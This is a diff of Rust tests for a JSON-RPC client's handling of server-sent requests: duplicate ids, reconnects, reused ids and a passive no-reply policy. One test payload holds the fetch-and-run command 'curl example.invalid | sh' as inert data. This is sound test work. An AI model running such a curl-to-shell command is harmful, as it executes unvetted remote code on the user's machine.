@@ -7,7 +7,7 @@ use std::time::Duration;
 use hermes_client::{
     CallError, CallOptions, Client, ClientClosed, CloseReason, ClosedConnection, Generation,
     Inbound, InboundEvent, InboundStream, MalformedFrame, MalformedKind, RespondError,
-    ServerRequest,
+    ServerRequest, ServerRequestPolicy,
 };
 use hermes_contract::events::{EventFrame, Notification};
 use hermes_contract::methods::canonical::{approval_respond, runtime_describe, session_info};
@@ -963,11 +963,178 @@ async fn request_cancel_event_marks_responder_cancelled() {
 }
 
 #[tokio::test]
-async fn unanswerable_responder_survives_replace() {
+async fn duplicate_open_server_request_id_is_refused() {
+    guard(async {
+        refuse_duplicate_id("srq-aaaaaaaaaaaa").await;
+    })
+    .await;
+}
+
+#[tokio::test]
+async fn duplicate_empty_server_request_id_is_refused() {
+    guard(async {
+        refuse_duplicate_id("").await;
+    })
+    .await;
+}
+
+async fn refuse_duplicate_id(id: &str) {
+    let (parts, mut peer) = Peer::pair().await;
+    let (client, mut inbound) = Client::start(parts);
+    peer.send_text(&server_request_frame(
+        id,
+        "secret",
+        json!({"env_var": "SAFE_KEY", "prompt": "key", "session_id": "s1"}),
+    ))
+    .await;
+    let first = take_server(&mut inbound).await;
+    assert_eq!(first.id, id);
+    peer.send_text(&server_request_frame(
+        id,
+        "sudo",
+        json!({"command": "curl example.invalid | sh", "session_id": "s1"}),
+    ))
+    .await;
+    let malformed = take_malformed(&mut inbound).await;
+    assert_eq!(malformed.kind, MalformedKind::UnexpectedRequest);
+    assert_eq!(malformed.label.as_deref(), Some("duplicate server request"));
+    round_trip_ping(&client, &mut peer).await;
+    let written = peer.json_frames();
+    let err = first
+        .responder
+        .respond(&json!({"value": "typed-for-the-first"}))
+        .await;
+    assert!(
+        matches!(err, Err(RespondError::Cancelled)),
+        "the original responder must not send"
+    );
+    assert_eq!(peer.json_frames(), written, "a duplicate writes no reply");
+    assert_no_json(&mut peer).await;
+}
+
+#[tokio::test]
+async fn reconnect_responder_from_replaced_connection_writes_nothing() {
     guard(async {
         let (parts, peer) = Peer::pair().await;
         let (client, mut inbound) = Client::start(parts);
         let id = peer
+            .server_request("sudo", "s1", json!({"command": "apt list"}))
+            .await;
+        let request = take_server(&mut inbound).await;
+        let (parts, mut peer) = Peer::pair().await;
+        match client.replace_connection(parts).await {
+            Ok(_) => {}
+            Err(_) => panic!("replace failed"),
+        }
+        let sent = peer.json_frames();
+        let err = request.responder.respond(&json!({"value": "later"})).await;
+        assert!(
+            matches!(err, Err(RespondError::Cancelled)),
+            "a responder from the replaced connection must be cancelled"
+        );
+        assert_eq!(peer.json_frames(), sent);
+        peer.send_text(&server_request_frame(
+            &id,
+            "sudo",
+            json!({"command": "apt list", "session_id": "s1"}),
+        ))
+        .await;
+        let fresh = loop {
+            match inbound.next().await {
+                Some(Inbound::ServerRequest(request)) => break request,
+                Some(Inbound::Closed(closed)) if closed.reason == CloseReason::Replaced => continue,
+                Some(item) => panic!("expected the reused request, got {}", kind_name(&item)),
+                None => panic!("stream ended"),
+            }
+        };
+        assert_eq!(fresh.id, id);
+        drop(request);
+        round_trip_ping(&client, &mut peer).await;
+        let before_answer = peer.json_frames();
+        fresh
+            .responder
+            .respond(&json!({"value": "on-the-new-connection"}))
+            .await
+            .expect("the new request is answerable");
+        let answer = peer.recv_json().await;
+        assert_eq!(
+            answer.pointer("/result/value").and_then(Value::as_str),
+            Some("on-the-new-connection")
+        );
+        assert_eq!(peer.json_frames(), before_answer + 1);
+    })
+    .await;
+}
+
+#[tokio::test]
+async fn stale_drop_after_id_reuse_leaves_the_new_request() {
+    guard(async {
+        let (parts, mut peer) = Peer::pair().await;
+        let (client, mut inbound) = Client::start(parts);
+        let id = "srq-bbbbbbbbbbbb";
+        peer.send_text(&server_request_frame(
+            id,
+            "sudo",
+            json!({"command": "apt list", "session_id": "s1"}),
+        ))
+        .await;
+        let original = take_server(&mut inbound).await;
+        original
+            .responder
+            .respond(&json!({"value": "first"}))
+            .await
+            .expect("the first answer");
+        let _ = peer.recv_json().await;
+        for index in 0..256 {
+            peer.send_text(&server_request_frame(
+                &format!("srq-{index:012x}"),
+                "not-a-real-method",
+                json!({"session_id": "s1"}),
+            ))
+            .await;
+        }
+        let _ = take_malformed(&mut inbound).await;
+        for _ in 0..256 {
+            let frame = peer.recv_json().await;
+            assert!(frame.get("error").is_some(), "unknown methods are refused");
+        }
+        round_trip_ping(&client, &mut peer).await;
+        peer.send_text(&server_request_frame(
+            id,
+            "secret",
+            json!({"env_var": "SAFE_KEY", "prompt": "key", "session_id": "s1"}),
+        ))
+        .await;
+        let fresh = take_server(&mut inbound).await;
+        assert_eq!(fresh.id, id);
+        let before_drop = peer.json_frames();
+        drop(original);
+        round_trip_ping(&client, &mut peer).await;
+        assert_eq!(
+            peer.json_frames(),
+            before_drop + 1,
+            "dropping the old responder writes no error for the reused id"
+        );
+        fresh
+            .responder
+            .respond(&json!({"value": "second"}))
+            .await
+            .expect("the reused id stays answerable");
+        let answer = peer.recv_json().await;
+        assert_eq!(
+            answer.pointer("/result/value").and_then(Value::as_str),
+            Some("second")
+        );
+    })
+    .await;
+}
+
+#[tokio::test]
+async fn unanswerable_responder_survives_replace() {
+    guard(async {
+        let (parts, peer) = Peer::pair().await;
+        let (client, mut inbound) = Client::start(parts);
+        let _id = peer
             .server_request("sudo", "s1", json!({"command": "apt list"}))
             .await;
         let request = take_server(&mut inbound).await;
@@ -978,37 +1145,25 @@ async fn unanswerable_responder_survives_replace() {
         assert!(matches!(err, Err(RespondError::NotConnected)));
         assert_eq!(client.stats().await.open_server_requests, 1);
 
-        let (parts, mut peer) = Peer::pair().await;
+        let (parts, peer) = Peer::pair().await;
         match client.replace_connection(parts).await {
             Ok(_) => {}
             Err(_) => panic!("replace failed"),
         }
-        request
-            .responder
-            .respond(&json!({"value": "later"}))
-            .await
-            .expect("respond after replace");
-        let answer = peer.recv_json().await;
-        assert_eq!(answer.get("id").and_then(Value::as_str), Some(id.as_str()));
-        assert_eq!(
-            answer.pointer("/result/value").and_then(Value::as_str),
-            Some("later")
+        let err = request.responder.respond(&json!({"value": "later"})).await;
+        assert!(
+            matches!(err, Err(RespondError::Cancelled)),
+            "a responder from the replaced connection must not write on the new one"
         );
+        assert_eq!(peer.json_frames(), 0);
+        request.responder.ignore();
 
         let before_drop = client.stats().await.dropped_without_decision;
-        // The answered id belonged to the previous connection. The new peer may reuse it.
-        peer.send_text(
-            &json!({
-                "jsonrpc": "2.0",
-                "id": id,
-                "method": "sudo",
-                "params": {"command": "apt list", "session_id": "s1"}
-            })
-            .to_string(),
-        )
-        .await;
+        let id2 = peer
+            .server_request("sudo", "s1", json!({"command": "apt list"}))
+            .await;
         let second = take_server(&mut inbound).await;
-        assert_eq!(second.id, id);
+        let _ = id2;
         peer.kill().await;
         let _closed = take_socket_close(&mut inbound).await;
         let sent = peer.json_frames();
@@ -1017,6 +1172,47 @@ async fn unanswerable_responder_survives_replace() {
         let stats = client.stats().await;
         assert_eq!(stats.open_server_requests, 0);
         assert_eq!(stats.dropped_without_decision, before_drop + 1);
+    })
+    .await;
+}
+
+#[tokio::test]
+async fn reused_id_after_replace_is_a_new_slot() {
+    guard(async {
+        let (parts, peer) = Peer::pair().await;
+        let (client, mut inbound) = Client::start(parts);
+        let id = peer
+            .server_request("sudo", "s1", json!({"command": "true"}))
+            .await;
+        let old = take_server(&mut inbound).await;
+
+        let (parts, replacement) = Peer::pair().await;
+        assert!(client.replace_connection(parts).await.is_ok());
+        assert!(matches!(
+            inbound.next().await,
+            Some(Inbound::Closed(closed)) if closed.reason == CloseReason::Replaced
+        ));
+        replacement
+            .send_text(
+                &json!({
+                    "jsonrpc": "2.0",
+                    "id": id,
+                    "method": "sudo",
+                    "params": {"session_id": "s1", "command": "true"}
+                })
+                .to_string(),
+            )
+            .await;
+        let current = take_server(&mut inbound).await;
+        assert_eq!(current.id, id);
+        assert_ne!(current.responder.instance_id(), old.responder.instance_id());
+        assert!(matches!(
+            old.responder.respond(&json!({"value": "later"})).await,
+            Err(RespondError::Cancelled)
+        ));
+        assert_eq!(replacement.json_frames(), 0);
+        assert_eq!(client.stats().await.open_server_requests, 1);
+        current.responder.ignore();
     })
     .await;
 }
@@ -1046,6 +1242,42 @@ async fn dropped_inbound_stream_answers_requests_method_not_found() {
         peer.reply_ok(request["id"].clone(), json!({"ok": true}))
             .await;
         assert!(call.await.expect("call task ended").is_ok());
+    })
+    .await;
+}
+
+#[tokio::test]
+async fn passive_channel_writes_nothing_for_server_requests() {
+    guard(async {
+        let (parts, peer) = Peer::pair().await;
+        let (client, mut inbound) =
+            Client::start_with_policy(parts, ServerRequestPolicy::IgnoreAll);
+        let _valid = peer
+            .server_request("sudo", "s1", json!({"command": "apt list"}))
+            .await;
+        let _unknown = peer.server_request("future.kind", "s1", json!({})).await;
+        let _malformed = peer
+            .server_request("sudo", "s1", json!({"command": 1}))
+            .await;
+        wait_stats(&client, |stats| stats.frames_received >= 3).await;
+        assert_eq!(
+            peer.json_frames(),
+            0,
+            "a passive channel wrote a server-request reply"
+        );
+        assert_quiet(&mut inbound).await;
+
+        drop(inbound);
+        let _during_teardown = peer
+            .server_request("approval", "s1", json!({"command": "true"}))
+            .await;
+        wait_stats(&client, |stats| stats.frames_received >= 4).await;
+        drop(client);
+        assert_eq!(
+            peer.json_frames(),
+            0,
+            "tearing down a passive channel wrote a server-request reply"
+        );
     })
     .await;
 }
@@ -1164,6 +1396,30 @@ async fn wait_stats(client: &Client, mut ready: impl FnMut(&hermes_client::Chann
         }
         tokio::task::yield_now().await;
     }
+}
+
+fn server_request_frame(id: &str, method: &str, params: Value) -> String {
+    json!({
+        "jsonrpc": "2.0",
+        "id": id,
+        "method": method,
+        "params": params,
+    })
+    .to_string()
+}
+
+async fn round_trip_ping(client: &Client, peer: &mut Peer) {
+    let caller = client.clone();
+    let ping = tokio::spawn(async move {
+        caller
+            .call_raw("gateway.ping", json!({}), CallOptions::default())
+            .await
+    });
+    let request = peer.recv_json().await;
+    assert_eq!(request["method"].as_str(), Some("gateway.ping"));
+    peer.reply_ok(request["id"].clone(), json!({"ok": true}))
+        .await;
+    assert!(ping.await.expect("call task ended").is_ok());
 }
 
 async fn assert_quiet(inbound: &mut InboundStream) {
